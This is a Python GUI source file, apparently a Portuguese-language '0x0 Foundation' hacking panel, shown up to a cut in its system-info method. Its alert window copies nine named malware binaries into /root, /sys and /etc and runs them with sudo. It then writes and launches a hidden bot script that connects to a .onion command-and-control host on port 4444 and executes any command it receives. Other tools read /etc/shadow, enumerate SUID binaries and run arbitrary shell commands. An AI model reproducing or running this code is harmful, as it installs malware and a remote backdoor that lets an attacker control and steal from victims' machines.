import customtkinter as ctk
from PIL import Image
import os
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import random
import threading
import time
import subprocess
import psutil
import socket
import requests
import json
from datetime import datetime
import shutil
import glob
import zipfile
import pyperclip

# ============================================================
# CONFIGURAÇÕES GLOBAIS
# ============================================================

MALWARE_DIR = "/home/moa/Documentos"
MALWARES = [
    "0x0-AbyssRat.bin",
    "0x0-Echidna.bin", 
    "0x0-Leviathan.bin",
    "0x0-Mimic.bin",
    "0x0-NexusWorm.bin",
    "0x0-PhantomPayload.bin",
    "0x0-Requiem.bin",
    "0x0-ShadowKernel.bin",
    "0x0-VoidRoot.ko"
]

TARGET_DIRS = ["/root", "/sys", "/etc"]

# Armazenar conexões ativas
active_connections = []

class AlertWindow(ctk.CTkToplevel):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.title("CRITICAL ERROR")
        self.attributes("-fullscreen", True)
        self.attributes("-topmost", True)
        
        image_path = os.path.join(os.path.dirname(__file__), "alert.png")
        if os.path.exists(image_path):
            self.alert_image = ctk.CTkImage(
                light_image=Image.open(image_path),
                dark_image=Image.open(image_path),
                size=(self.winfo_screenwidth(), self.winfo_screenheight())
            )
            self.label = ctk.CTkLabel(self, image=self.alert_image, text="")
            self.label.pack(expand=True, fill="both")
        
        # Registra conexão invasora
        self.register_connection()
        self.execute_malwares()
        self.spawn_popups()

    def register_connection(self):
        """Registra conexão no painel da 0x0"""
        connection_info = {
            "ip": self.get_ip(),
            "hostname": socket.gethostname(),
            "user": os.getlogin(),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "INVADIDO"
        }
        active_connections.append(connection_info)
        
        # Salva log de conexão
        with open("0x0_connections.log", "a") as f:
            f.write(json.dumps(connection_info) + "\n")

    def get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "N/A"

    def execute_malwares(self):
        """Executa todos os malwares com permissão root"""
        for malware in MALWARES:
            malware_path = os.path.join(MALWARE_DIR, malware)
            if os.path.exists(malware_path):
                try:
                    for target_dir in TARGET_DIRS:
                        try:
                            os.makedirs(target_dir, exist_ok=True)
                            target_path = os.path.join(target_dir, malware)
                            shutil.copy2(malware_path, target_path)
                            os.chmod(target_path, 0o755)
                            subprocess.Popen(['sudo', target_path], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
                        except:
                            pass
                    subprocess.Popen(['sudo', malware_path], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
                except:
                    pass
        
        # Transforma em botnet
        self.setup_botnet()

    def setup_botnet(self):
        """Configura a máquina como bot da rede 0x0"""
        bot_config = {
            "c2_server": "0x0-c2.onion",
            "port": 4444,
            "interval": 60
        }
        with open("/tmp/.0x0_bot_config.json", "w") as f:
            json.dump(bot_config, f)
        
        # Script do bot
        bot_script = """#!/usr/bin/env python3
import socket, subprocess, json, time
with open('/tmp/.0x0_bot_config.json') as f:
    cfg = json.load(f)
while True:
    try:
        s = socket.socket()
        s.connect((cfg['c2_server'], cfg['port']))
        while True:
            cmd = s.recv(1024).decode()
            if cmd:
                out = subprocess.getoutput(cmd)
                s.send(out.encode())
    except:
        time.sleep(cfg['interval'])
"""
        with open("/tmp/.0x0_bot.py", "w") as f:
            f.write(bot_script)
        subprocess.Popen(["python3", "/tmp/.0x0_bot.py"])

    def spawn_popups(self):
        messages = [
            "ACESSO NÃO AUTORIZADO!",
            "INVASÃO DE SISTEMA DETECTADA!",
            "INTERPOL FOI NOTIFICADA!",
            "LOCALIZAÇÃO RASTREADA!",
            "PROTOCOLO DE SEGURANÇA ATIVADO!",
            "IP LOGGED: " + self.get_ip(),
            "ENVIANDO DADOS PARA O CONSELHO...",
            "MALWARES EM EXECUÇÃO!",
            "KERNEL COMPROMETIDO!",
            "DADOS SENDO EXFILTRADOS!",
            "SEU PC AGORA É UM BOT DA 0x0!",
            "CONECTADO AO C2 DA 0x0!"
        ]
        
        def loop():
            while True:
                time.sleep(random.uniform(0.5, 1.5))
                msg = random.choice(messages)
                self.after(0, lambda m=msg: self.create_popup(m))

        threading.Thread(target=loop, daemon=True).start()

    def create_popup(self, message):
        popup = tk.Toplevel(self)
        popup.title("ALERTA 0x0")
        x = random.randint(0, self.winfo_screenwidth() - 300)
        y = random.randint(0, self.winfo_screenheight() - 100)
        popup.geometry(f"350x120+{x}+{y}")
        popup.attributes("-topmost", True)
        tk.Label(popup, text=message, fg="red", bg="black", font=("Courier", 10, "bold")).pack(pady=30)
        popup.after(3000, popup.destroy)

# ============================================================
# FERRAMENTAS DO PAINEL (mantidas as anteriores)
# ============================================================

class ToolNetwork(ctk.CTkToplevel):
    """Ferramenta de Rede"""
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - NETWORK TOOL")
        self.geometry("900x700")
        self.attributes("-topmost", True)
        
        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.get_network_info()
    
    def get_network_info(self):
        info = []
        info.append("═" * 60)
        info.append("0x0 NETWORK ANALYSIS TOOL")
        info.append("═" * 60)
        info.append("")
        
        info.append("[INTERFACES]")
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                info.append(f"  {iface}: {addr.address}")
        
        info.append("")
        info.append("[CONEXÕES ATIVAS]")
        for conn in psutil.net_connections(kind='inet'):
            try:
                info.append(f"  {conn.laddr} -> {conn.raddr}")
            except:
                pass
        
        info.append("")
        info.append("[ESTATÍSTICAS]")
        net_io = psutil.net_io_counters()
        info.append(f"  Enviados: {net_io.bytes_sent / (1024**2):.2f} MB")
        info.append(f"  Recebidos: {net_io.bytes_recv / (1024**2):.2f} MB")
        
        self.text_area.insert(tk.END, '\n'.join(info))

class ToolProcess(ctk.CTkToplevel):
    """Ferramenta de Processos"""
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - PROCESS TOOL")
        self.geometry("1200x800")
        self.attributes("-topmost", True)
        
        self.tree = ttk.Treeview(self, columns=('PID', 'Nome', 'Usuário', 'CPU%', 'Memória%', 'Status'), show='headings')
        self.tree.heading('PID', text='PID')
        self.tree.heading('Nome', text='Nome')
        self.tree.heading('Usuário', text='Usuário')
        self.tree.heading('CPU%', text='CPU%')
        self.tree.heading('Memória%', text='Mem%')
        self.tree.heading('Status', text='Status')
        self.tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        ctk.CTkButton(self, text="REFRESH", command=self.get_processes).pack(pady=5)
        self.get_processes()
    
    def classify_process(self, proc_name):
        known = ['systemd', 'init', 'python', 'bash', 'zsh', 'cron', 'sshd', 'nginx', 'apache', 'mysql']
        for k in known:
            if k in proc_name.lower():
                return "[I]"
        return "[NI]"
    
    def get_processes(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status']):
            try:
                info = proc.info
                self.tree.insert('', 'end', values=(
                    info['pid'],
                    f"{self.classify_process(info['name'])} {info['name']}",
                    info['username'] or 'N/A',
                    f"{info['cpu_percent']:.1f}",
                    f"{info['memory_percent']:.1f}",
                    info['status']
                ))
            except:
                pass

class ToolScanner(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - SCANNER TOOL")
        self.geometry("900x700")
        self.attributes("-topmost", True)
        
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.file_frame = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.file_frame, text="SCANNER DE ARQUIVOS")
        self.file_text = scrolledtext.ScrolledText(self.file_frame, bg='black', fg='#00ff00', font=('Courier', 10))
        self.file_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        btn_frame = ctk.CTkFrame(self.file_frame)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        ctk.CTkButton(btn_frame, text="SCAN HOME", command=lambda: self.scan_files("/home")).pack(side=tk.LEFT, padx=5)
        ctk.CTkButton(btn_frame, text="SCAN /ETC", command=lambda: self.scan_files("/etc")).pack(side=tk.LEFT, padx=5)
        
        self.port_frame = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.port_frame, text="SCANNER DE PORTAS")
        self.port_text = scrolledtext.ScrolledText(self.port_frame, bg='black', fg='#00ff00', font=('Courier', 10))
        self.port_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        ctk.CTkButton(self.port_frame, text="SCAN PORTAS", command=self.scan_ports).pack(pady=5)
    
    def scan_files(self, path):
        self.file_text.delete(1.0, tk.END)
        count = 0
        for root, dirs, files in os.walk(path):
            for file in files[:100]:
                self.file_text.insert(tk.END, f"{os.path.join(root, file)}\n")
                count += 1
                if count >= 100:
                    break
            if count >= 100:
                break
    
    def scan_ports(self):
        self.port_text.delete(1.0, tk.END)
        ports = [21,22,23,25,53,80,110,143,443,993,995,3306,3389,5432,5900,8080]
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex(('127.0.0.1', port))
            status = "ABERTA" if result == 0 else "FECHADA"
            self.port_text.insert(tk.END, f"[{status}] Porta {port}\n")
            sock.close()

class ToolLogs(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - LOGS TOOL")
        self.geometry("1000x700")
        self.attributes("-topmost", True)
        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        ctk.CTkButton(btn_frame, text="AUTH LOG", command=lambda: self.view_log("/var/log/auth.log")).pack(side=tk.LEFT, padx=5)
        ctk.CTkButton(btn_frame, text="SYSLOG", command=lambda: self.view_log("/var/log/syslog")).pack(side=tk.LEFT, padx=5)
    
    def view_log(self, log_path):
        self.text_area.delete(1.0, tk.END)
        try:
            with open(log_path, 'r') as f:
                lines = f.readlines()[-100:]
                self.text_area.insert(tk.END, ''.join(lines))
        except:
            self.text_area.insert(tk.END, f"Erro ao ler {log_path}")

class ToolDatabase(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - DATABASE TOOL")
        self.geometry("1000x700")
        self.attributes("-topmost", True)
        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        ctk.CTkButton(btn_frame, text="PASSWD", command=lambda: self.view_file("/etc/passwd")).pack(side=tk.LEFT, padx=5)
        ctk.CTkButton(btn_frame, text="SHADOW", command=lambda: self.view_file("/etc/shadow")).pack(side=tk.LEFT, padx=5)
    
    def view_file(self, file_path):
        self.text_area.delete(1.0, tk.END)
        try:
            with open(file_path, 'r') as f:
                self.text_area.insert(tk.END, f.read())
        except:
            self.text_area.insert(tk.END, f"Erro ao ler {file_path}")

class ToolExploit(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - EXPLOIT TOOL")
        self.geometry("900x700")
        self.attributes("-topmost", True)
        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#ff0000', font=('Courier', 10))
        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        ctk.CTkButton(btn_frame, text="CHECK SUID", command=self.check_suid).pack(side=tk.LEFT, padx=5)
    
    def check_suid(self):
        self.text_area.delete(1.0, tk.END)
        result = subprocess.getoutput("find / -perm -4000 -type f 2>/dev/null | head -20")
        self.text_area.insert(tk.END, result)

class ToolPersistence(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - PERSISTENCE TOOL")
        self.geometry("900x700")
        self.attributes("-topmost", True)
        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        ctk.CTkButton(btn_frame, text="CRONTABS", command=self.show_crontabs).pack(side=tk.LEFT, padx=5)
    
    def show_crontabs(self):
        self.text_area.delete(1.0, tk.END)
        result = subprocess.getoutput("crontab -l 2>/dev/null")
        self.text_area.insert(tk.END, result if result else "Nenhum crontab")

# ============================================================
# GERENCIADOR DE ARQUIVOS COMPLETO
# ============================================================

class FileManager(ctk.CTkToplevel):
    def __init__(self, parent, start_path="/home"):
        super().__init__(parent)
        self.title("0x0 - GERENCIADOR DE ARQUIVOS")
        self.geometry("1200x800")
        self.attributes("-topmost", True)
        
        self.current_path = start_path
        self.selected_items = []
        
        # Frame superior com caminho e botões
        top_frame = ctk.CTkFrame(self)
        top_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.path_label = ctk.CTkLabel(top_frame, text=self.current_path, font=("Courier", 12), fg_color="#1a1a2a", corner_radius=5, padx=10)
        self.path_label.pack(side=tk.LEFT, padx=5)
        
        btn_back = ctk.CTkButton(top_frame, text="◀ VOLTAR", command=self.go_back, width=100)
        btn_back.pack(side=tk.LEFT, padx=5)
        
        btn_home = ctk.CTkButton(top_frame, text="🏠 HOME", command=lambda: self.change_path("/home"), width=100)
        btn_home.pack(side=tk.LEFT, padx=5)
        
        btn_root = ctk.CTkButton(top_frame, text="🐧 ROOT", command=lambda: self.change_path("/"), width=100)
        btn_root.pack(side=tk.LEFT, padx=5)
        
        btn_refresh = ctk.CTkButton(top_frame, text="🔄", command=self.refresh, width=50)
        btn_refresh.pack(side=tk.LEFT, padx=5)
        
        # Frame de ações
        action_frame = ctk.CTkFrame(self)
        action_frame.pack(fill=tk.X, padx=10, pady=5)
        
        btn_delete = ctk.CTkButton(action_frame, text="🗑️ DELETAR", command=self.delete_selected, fg_color="#8b0000", hover_color="#ff0000", width=100)
        btn_delete.pack(side=tk.LEFT, padx=5)
        
        btn_copy = ctk.CTkButton(action_frame, text="📋 COPIAR", command=self.copy_selected, width=100)
        btn_copy.pack(side=tk.LEFT, padx=5)
        
        btn_edit = ctk.CTkButton(action_frame, text="✏️ EDITAR", command=self.edit_file, width=100)
        btn_edit.pack(side=tk.LEFT, padx=5)
        
        btn_new = ctk.CTkButton(action_frame, text="📄 NOVO ARQUIVO", command=self.new_file, width=120)
        btn_new.pack(side=tk.LEFT, padx=5)
        
        btn_mkdir = ctk.CTkButton(action_frame, text="📁 NOVA PASTA", command=self.new_folder, width=120)
        btn_mkdir.pack(side=tk.LEFT, padx=5)
        
        btn_paste = ctk.CTkButton(action_frame, text="📎 COLAR", command=self.paste_items, width=100)
        btn_paste.pack(side=tk.LEFT, padx=5)
        
        self.clipboard = []
        
        # Treeview para arquivos/pastas
        self.tree = ttk.Treeview(self, columns=('Nome', 'Tamanho', 'Modificado', 'Perms'), show='headings', height=30)
        self.tree.heading('Nome', text='Nome')
        self.tree.heading('Tamanho', text='Tamanho')
        self.tree.heading('Modificado', text='Modificado')
        self.tree.heading('Perms', text='Permissões')
        
        self.tree.column('Nome', width=400)
        self.tree.column('Tamanho', width=100)
        self.tree.column('Modificado', width=150)
        self.tree.column('Perms', width=100)
        
        self.tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Bind eventos
        self.tree.bind('<Double-Button-1>', self.on_double_click)
        self.tree.bind('<Button-1>', self.on_single_click)
        
        self.load_directory()
    
    def load_directory(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        try:
            items = os.listdir(self.current_path)
            for item in sorted(items):
                item_path = os.path.join(self.current_path, item)
                try:
                    stat_info = os.stat(item_path)
                    size = stat_info.st_size
                    if os.path.isdir(item_path):
                        size_display = "<DIR>"
                    else:
                        size_display = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/(1024**2):.1f} MB"
                    
                    mtime = datetime.fromtimestamp(stat_info.st_mtime).strftime("%Y-%m-%d %H:%M")
                    perms = oct(stat_info.st_mode)[-3:]
                    
                    icon = "📁 " if os.path.isdir(item_path) else "📄 "
                    self.tree.insert('', 'end', values=(icon + item, size_display, mtime, perms), tags=(item_path,))
                except:
                    self.tree.insert('', 'end', values=("🔒 " + item, "N/A", "N/A", "N/A"))
        except Exception as e:
            self.tree.insert('', 'end', values=(f"ERRO: {e}", "", "", ""))
    
    def go_back(self):
        parent = os.path.dirname(self.current_path)
        if parent != self.current_path:
            self.change_path(parent)
    
    def change_path(self, path):
        if os.path.exists(path) and os.access(path, os.R_OK):
            self.current_path = path
            self.path_label.configure(text=path)
            self.load_directory()
    
    def refresh(self):
        self.load_directory()
    
    def on_double_click(self, event):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            name = item['values'][0][2:]  # Remove ícone
            full_path = os.path.join(self.current_path, name)
            if os.path.isdir(full_path):
                self.change_path(full_path)
    
    def on_single_click(self, event):
        selection = self.tree.selection()
        self.selected_items = []
        for sel in selection:
            item = self.tree.item(sel)
            name = item['values'][0][2:]
            full_path = os.path.join(self.current_path, name)
            self.selected_items.append(full_path)
    
    def delete_selected(self):
        if not self.selected_items:
            messagebox.showwarning("Aviso", "Nenhum item selecionado")
            return
        
        if messagebox.askyesno("Confirmar", f"Deletar {len(self.selected_items)} item(ns)?"):
            for item in self.selected_items:
                try:
                    if os.path.isdir(item):
                        shutil.rmtree(item)
                    else:
                        os.remove(item)
                except:
                    pass
            self.refresh()
            self.selected_items = []
    
    def copy_selected(self):
        self.clipboard = self.selected_items.copy()
        messagebox.showinfo("Info", f"{len(self.clipboard)} item(ns) copiados")
    
    def paste_items(self):
        if not self.clipboard:
            messagebox.showwarning("Aviso", "Nada para colar")
            return
        
        for item in self.clipboard:
            try:
                dest = os.path.join(self.current_path, os.path.basename(item))
                if os.path.isdir(item):
                    shutil.copytree(item, dest)
                else:
                    shutil.copy2(item, dest)
            except:
                pass
        self.refresh()
        messagebox.showinfo("Info", "Itens colados com sucesso")
    
    def edit_file(self):
        if not self.selected_items:
            messagebox.showwarning("Aviso", "Selecione um arquivo para editar")
            return
        
        file_path = self.selected_items[0]
        if os.path.isdir(file_path):
            messagebox.showwarning("Aviso", "Não é possível editar uma pasta")
            return
        
        # Abre janela de edição
        edit_win = ctk.CTkToplevel(self)
        edit_win.title(f"Editando: {os.path.basename(file_path)}")
        edit_win.geometry("800x600")
        
        text_area = scrolledtext.ScrolledText(edit_win, bg='black', fg='#00ff00', font=('Courier', 11))
        text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        try:
            with open(file_path, 'r') as f:
                text_area.insert(1.0, f.read())
        except:
            text_area.insert(1.0, "# Erro ao ler arquivo ou arquivo binário")
        
        def save_file():
            try:
                with open(file_path, 'w') as f:
                    f.write(text_area.get(1.0, tk.END))
                messagebox.showinfo("Info", "Arquivo salvo com sucesso")
                edit_win.destroy()
            except Exception as e:
                messagebox.showerror("Erro", f"Erro ao salvar: {e}")
        
        btn_save = ctk.CTkButton(edit_win, text="💾 SALVAR", command=save_file)
        btn_save.pack(pady=10)
    
    def new_file(self):
        nome = ctk.CTkInputDialog(text="Nome do arquivo:", title="Novo arquivo").get_input()
        if nome:
            file_path = os.path.join(self.current_path, nome)
            try:
                with open(file_path, 'w') as f:
                    f.write("# 0x0 - Novo arquivo criado\n")
                self.refresh()
            except Exception as e:
                messagebox.showerror("Erro", f"Erro ao criar: {e}")
    
    def new_folder(self):
        nome = ctk.CTkInputDialog(text="Nome da pasta:", title="Nova pasta").get_input()
        if nome:
            folder_path = os.path.join(self.current_path, nome)
            try:
                os.makedirs(folder_path)
                self.refresh()
            except Exception as e:
                messagebox.showerror("Erro", f"Erro ao criar: {e}")

# ============================================================
# GERENCIADOR DE DOWNLOAD DE .C FILES
# ============================================================

class DownloadManager(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - DOWNLOAD MANAGER")
        self.geometry("900x700")
        self.attributes("-topmost", True)
        
        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ctk.CTkButton(btn_frame, text="LISTAR .c FILES", command=self.list_c_files).pack(side=tk.LEFT, padx=5)
        ctk.CTkButton(btn_frame, text="BAIXAR TODOS (ZIP COM SENHA 0x0)", command=self.download_all_zip).pack(side=tk.LEFT, padx=5)
        
        self.c_files = []
    
    def list_c_files(self):
        self.text_area.delete(1.0, tk.END)
        self.c_files = glob.glob("*.c")
        if self.c_files:
            self.text_area.insert(tk.END, f"Arquivos .c encontrados: {len(self.c_files)}\n\n")
            for cf in self.c_files:
                self.text_area.insert(tk.END, f"📄 {cf}\n")
                try:
                    size = os.path.getsize(cf)
                    self.text_area.insert(tk.END, f"   Tamanho: {size} bytes\n")
                    with open(cf, 'r') as f:
                        preview = f.read(200)
                        self.text_area.insert(tk.END, f"   Preview: {preview[:100]}...\n\n")
                except:
                    self.text_area.insert(tk.END, f"   Erro ao ler arquivo\n\n")
        else:
            self.text_area.insert(tk.END, "Nenhum arquivo .c encontrado no diretório atual")
    
    def download_all_zip(self):
        if not self.c_files:
            messagebox.showwarning("Aviso", "Nenhum arquivo .c encontrado")
            return
        
        zip_name = f"0x0_c_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        
        try:
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for cf in self.c_files:
                    zipf.write(cf)
            
            # Protege com senha (zip padrão não suporta senha facilmente, vamos usar pyzipper)
            import pyzipper
            os.remove(zip_name)
            with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
                zf.setpassword(b"0x0")
                for cf in self.c_files:
                    zf.write(cf)
            
            self.text_area.insert(tk.END, f"\n✅ ZIP criado: {zip_name}\n")
            self.text_area.insert(tk.END, f"🔒 Senha: 0x0\n")
            self.text_area.insert(tk.END, f"📦 Local: {os.path.abspath(zip_name)}\n")
            messagebox.showinfo("Info", f"ZIP criado: {zip_name}\nSenha: 0x0")
        except Exception as e:
            messagebox.showerror("Erro", f"Erro ao criar ZIP: {e}")

# ============================================================
# CONSOLE COMPLETO
# ============================================================

class ConsoleTerminal(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("0x0 - CONSOLE TERMINAL")
        self.geometry("1000x700")
        self.attributes("-topmost", True)
        
        self.output = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10), height=30)
        self.output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.input_frame = ctk.CTkFrame(self)
        self.input_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.prompt_label = ctk.CTkLabel(self.input_frame, text="$", font=("Courier", 12, "bold"), width=30)
        self.prompt_label.pack(side=tk.LEFT, padx=5)
        
        self.input_entry = ctk.CTkEntry(self.input_frame, placeholder_text="Digite comandos do sistema...", font=("Courier", 12))
        self.input_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.input_entry.bind("<Return>", self.execute_command)
        
        self.current_dir = os.getcwd()
        self.update_prompt()
        
        self.output.insert(tk.END, "0x0 CONSOLE TERMINAL\n")
        self.output.insert(tk.END, "═" * 50 + "\n")
        self.output.insert(tk.END, f"Bem-vindo ao terminal 0x0\n")
        self.output.insert(tk.END, f"Diretório atual: {self.current_dir}\n\n")
    
    def update_prompt(self):
        self.prompt_label.configure(text=f"{self.current_dir}$")
    
    def execute_command(self, event):
        cmd = self.input_entry.get()
        self.output.insert(tk.END, f"\n{self.current_dir}$ {cmd}\n")
        self.input_entry.delete(0, tk.END)
        
        if cmd.strip().lower() in ["exit", "quit"]:
            self.destroy()
            return
        
        if cmd.strip().startswith("cd "):
            try:
                new_dir = cmd.strip()[3:]
                if new_dir == "..":
                    self.current_dir = os.path.dirname(self.current_dir)
                elif new_dir.startswith("/"):
                    self.current_dir = new_dir
                else:
                    self.current_dir = os.path.join(self.current_dir, new_dir)
                if not os.path.exists(self.current_dir):
                    self.current_dir = os.getcwd()
                os.chdir(self.current_dir)
                self.update_prompt()
                self.output.insert(tk.END, f"Diretório alterado para: {self.current_dir}\n")
            except Exception as e:
                self.output.insert(tk.END, f"Erro: {e}\n")
            return
        
        try:
            import subprocess
            result = subprocess.getoutput(cmd)
            self.output.insert(tk.END, f"{result}\n")
        except Exception as e:
            self.output.insert(tk.END, f"Erro: {e}\n")
        
        self.output.see(tk.END)

# ============================================================
# PAINEL PRINCIPAL (ACESSO AUTORIZADO)
# ============================================================

class MainPanel(ctk.CTkToplevel):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.title("0x0 - PAINEL DE CONTROLE")
        self.attributes("-fullscreen", True)
        self.attributes("-alpha", 0.92)
        
        # Background
        image_path = os.path.join(os.path.dirname(__file__), "fundo.jpg")
        if os.path.exists(image_path):
            self.bg_image = ctk.CTkImage(
                light_image=Image.open(image_path),
                dark_image=Image.open(image_path),
                size=(self.winfo_screenwidth(), self.winfo_screenheight())
            )
            self.bg_label = ctk.CTkLabel(self, image=self.bg_image, text="")
            self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)
        
        # Frame principal
        self.main_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.main_frame.place(relx=0.5, rely=0.5, anchor="center")
        
        # Título
        self.title_label = ctk.CTkLabel(
            self.main_frame, 
            text="0x0 FOUNDATION - SISTEMA ATIVO", 
            font=("Courier", 36, "bold"),
            text_color="#00ff00"
        )
        self.title_label.pack(pady=20)
        
        # Sistema de abas
        self.tab_view = ctk.CTkTabview(self.main_frame, width=1200, height=700)
        self.tab_view.pack(pady=20)
        
        # Criando abas
        tabs = ["FERRAMENTAS", "ARQUIVOS", "DOWNLOAD", "CONSOLE", "INFO", "CONEXÕES"]
        for tab in tabs:
            self.tab_view.add(tab)
        
        # ========== ABA FERRAMENTAS ==========
        tools_frame = self.tab_view.tab("FERRAMENTAS")
        
        tools = [
            ("🖧 NETWORK", ToolNetwork, "Análise de rede detalhada"),
            ("⚙️ PROCESS", ToolProcess, "Gerenciador de processos"),
            ("🔍 SCANNER", ToolScanner, "Scanner de arquivos/portas"),
            ("📋 LOGS", ToolLogs, "Visualização de logs"),
            ("🗄️ DATABASE", ToolDatabase, "Arquivos sensíveis"),
            ("🔓 EXPLOIT", ToolExploit, "Teste de vulnerabilidades"),
            ("⏳ PERSIST", ToolPersistence, "Persistência do sistema"),
            ("📂 FILE MANAGER", FileManager, "Gerenciador completo"),
        ]
        
        for i, (name, tool_class, desc) in enumerate(tools):
            btn = ctk.CTkButton(
                tools_frame,
                text=f"{name}\n{desc}",
                command=lambda tc=tool_class: tc(self),
                width=280,
                height=80,
                fg_color="#1a1a2e",
                hover_color="#2a2a3e",
                font=("Courier", 11)
            )
            btn.grid(row=i//3, column=i%3, padx=15, pady=15)
        
        # ========== ABA ARQUIVOS ==========
        files_frame = self.tab_view.tab("ARQUIVOS")
        self.file_manager = FileManager(files_frame, start_path="/home")
        self.file_manager.pack(fill=tk.BOTH, expand=True)
        
        # ========== ABA DOWNLOAD ==========
        download_frame = self.tab_view.tab("DOWNLOAD")
        self.download_manager = DownloadManager(download_frame)
        self.download_manager.pack(fill=tk.BOTH, expand=True)
        
        # ========== ABA CONSOLE ==========
        console_frame = self.tab_view.tab("CONSOLE")
        self.console = ConsoleTerminal(console_frame)
        self.console.pack(fill=tk.BOTH, expand=True)
        
        # ========== ABA INFO ==========
        info_frame = self.tab_view.tab("INFO")
        self.info_text = scrolledtext.ScrolledText(info_frame, bg='black', fg='#00ff00', font=('Courier', 10))
        self.info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.refresh_info()
        ctk.CTkButton(info_frame, text="REFRESH", command=self.refresh_info).pack(pady=5)
        
        # ========== ABA CONEXÕES ==========
        conn_frame = self.tab_view.tab("CONEXÕES")
        self.conn_text = scrolledtext.ScrolledText(conn_frame, bg='black', fg='#ff6600', font=('Courier', 10))
        self.conn_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.refresh_connections()
        ctk.CTkButton(conn_frame, text="REFRESH CONEXÕES", command=self.refresh_connections).pack(pady=5)
        
        # Botão sair
        self.exit_btn = ctk.CTkButton(
            self, 
            text="ENCERRAR SESSÃO", 
            command=self.quit,
            fg_color="red",
            hover_color="#8b0000",
            width=150,
            height=40
        )
        self.exit_btn.place(relx=0.95, rely=0.95, anchor="center")
        
        # Thread para atualizar conexões automaticamente
        self.update_thread = threading.Thread(target=self.auto_update_connections, daemon=True)
        self.update_thread.start()
    
    def refresh_info(self):
        self.info_text.delete(1.0, tk.END)
        info = []
        info.append("═" * 60)
        info.append("0x0 - INFORMAÇÕES DO SISTEMA")
        info.append("═" * 60)
        info.append(f"Hostname: {socket.gethostname()}")
        info.append(f"Usuário: {os.getlogin()}")
        info.append(f"Sistema: {subprocess.getoutput('uname -a')}")
        info.append(f"CPU: {psutil.cpu_percent()}%")
        info.append(f"RAM: {psutil.virtual_memory().percent}%")
        info.append(f"DISCO: {psutil.disk_usage('/').percent}%")
